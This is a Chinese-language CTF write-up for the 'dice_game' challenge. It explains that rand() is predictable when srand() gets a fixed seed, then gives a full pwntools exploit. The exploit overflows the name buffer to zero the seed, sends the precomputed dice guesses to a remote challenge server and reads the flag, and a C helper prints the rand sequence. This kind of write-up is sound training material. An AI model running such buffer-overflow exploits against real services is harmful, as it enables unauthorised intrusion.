# dice_game+随机数漏洞

这个题目主要用到的知识点就是对于srand和rand随机数的一个漏洞这里我们对这两个随机数的漏洞进行一个分析

这样理解为在这两个函数中随机数的随机性并不是完全随机的而是在一个范围内形成一个随机性从而使得看起来比较随机

当他的种子为1时输出就是5 5 4 4 5 4 0 0 4 2

种子为6时每次运行都将输出：4 1 5 1 4 3 4 4 2 2

而这个种子函数就为srand

因此我们在这个题目中可以直接溢出修改srand的值来控制这个种子使得我们得到一个定值

因此我们的exp

```py
from pwn import *
from ctypes import *

context.log_level = 'debug'
libc = cdll.LoadLibrary("libc.so.6")
res = []


def dice_game():
    for i in range(50):
        rand = libc.rand()
        res.append(rand%6+1)
    print(res)


# p = process('./dice_game')
p = remote("223.112.5.141",57457)
dice_game()

payload = b'a' * 0x40 + p64(0)
p.sendlineafter("your name: ", payload)
for point in res:
    p.sendlineafter("point(1~6): ", str(point))

p.recvline()
p.recvline()
flag = p.recvline()
print(flag)
```

但是也可以独立的控制srand这里我们的c代码为

```c
#include <stdio.h>
#include <stdlib.h>
 
int main(){
	int s,i;	
	srand(6);
 
	for(i = 0;i<50;i++){
		
		s = rand()%6+1;
		printf("%d,",s);
 
	}
 
 
	return 0;
}
```

但是这里要明白一点就是要在和程序同样的系统中进行运行否则会应为libc的不同而随机数不同



